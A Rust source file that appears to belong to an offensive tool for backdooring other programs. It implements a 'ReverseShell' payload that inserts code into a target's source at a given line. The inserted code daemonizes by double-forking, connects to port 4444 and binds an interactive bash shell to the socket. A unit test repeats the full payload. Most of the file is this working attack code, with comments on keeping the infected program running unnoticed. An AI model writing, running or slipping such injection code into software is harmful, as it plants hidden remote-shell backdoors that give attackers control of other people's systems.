use log::*;
// payload result wrapper
pub type PayloadResult<R> = Result<R, String>;

// trait Payload which must be implemented by all available payloads
// permits a payload to be injectable to some given code in the line specified
pub trait Payload {
    // takes a bunch of string lines and a line number and injects the payload implementing it
    // into the string starting from <line_no>+1
    fn inject(&self, src: &str, line_no: &usize) -> PayloadResult<String>;
}

pub fn payload_from_str(src: &str) -> &dyn Payload {
    match src {
        "revshell" => &ReverseShell{},
        _ => {
            info!("payload specified not found, using default ReverseShell");
            &ReverseShell{}
        }
    }
}

// The function calling the injected method may be in a thread, so multiple threads could call the
// injected function at once breaking the original code
// Add a mutex layer for solving that
// When trying to connect to the tcpstream, if there is no listener, the original code would fail,
// add another layer for that

pub struct ReverseShell {}
impl Payload for ReverseShell {
    fn inject(&self, src: &str, line_no: &usize) -> PayloadResult<String> {
        let rev_shell_code = "extern \"C\" {
        fn fork() -> i32;
        fn close(fd: i32) -> i32;
        fn setsid() -> i32;
        }
        use std::{os::fd::{FromRawFd, AsRawFd}, process::{Command, Stdio}};

        static mut IN: bool = false;
        unsafe {
            if !IN {
                IN = true;
                let pid = fork();
                if pid == 0 {
                    let pid_child = fork();
                    if pid_child > 0 {std::process::exit(0)}
                    setsid();
                    let pid_gchild = fork();
                    if pid_gchild > 0 {std::process::exit(0)}
                    let sock = std::net::TcpStream::connect(\"localhost:4444\").unwrap();
                    let fd = sock.as_raw_fd();
                    Command::new(\"/bin/bash\")
                    .arg(\"-i\")
                    .stdin(unsafe {Stdio::from_raw_fd(fd)})
                    .stdout(unsafe {Stdio::from_raw_fd(fd)})
                    .stderr(unsafe {Stdio::from_raw_fd(fd)})
                    .spawn()
                    .unwrap()
                    .wait()
                    .unwrap();
                    std::process::exit(0);
                }
            }
        }\n";
        let mut injected_code = "".to_string();
        let mut curr_line = 0;
        let mut src_iter = src.lines();
        while &curr_line < line_no {
            injected_code += &(src_iter.next().unwrap().to_string()+"\n");
            curr_line += 1;
        }
        injected_code += rev_shell_code;
        injected_code += src_iter.map(|line| line.to_string()+"\n").collect::<String>().as_str();
        Ok(injected_code)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn injection_works() {
        let payload = "extern \"C\" {
        fn fork() -> i32;
        fn close(fd: i32) -> i32;
        fn setsid() -> i32;
        }
        use std::{os::fd::{FromRawFd, AsRawFd}, process::{Command, Stdio}};

        static mut IN: bool = false;
        unsafe {
            if !IN {
                IN = true;
                let pid = fork();
                if pid == 0 {
                    let pid_child = fork();
                    if pid_child > 0 {std::process::exit(0)}
                    setsid();
                    let pid_gchild = fork();
                    if pid_gchild > 0 {std::process::exit(0)}
                    let sock = std::net::TcpStream::connect(\"localhost:4444\").unwrap();
                    let fd = sock.as_raw_fd();
                    Command::new(\"/bin/bash\")
                    .arg(\"-i\")
                    .stdin(unsafe {Stdio::from_raw_fd(fd)})
                    .stdout(unsafe {Stdio::from_raw_fd(fd)})
                    .stderr(unsafe {Stdio::from_raw_fd(fd)})
                    .spawn()
                    .unwrap()
                    .wait()
                    .unwrap();
                    std::process::exit(0);
                }
            }
        }\n";
        let target_file = "tests/injection_test_file.rs";
        let rshell = ReverseShell{};
        let injected_file = rshell.inject(&std::fs::read_to_string(target_file).unwrap(), &3).unwrap();
        println!("{injected_file}");
        assert!(injected_file.contains(payload));
    }
}
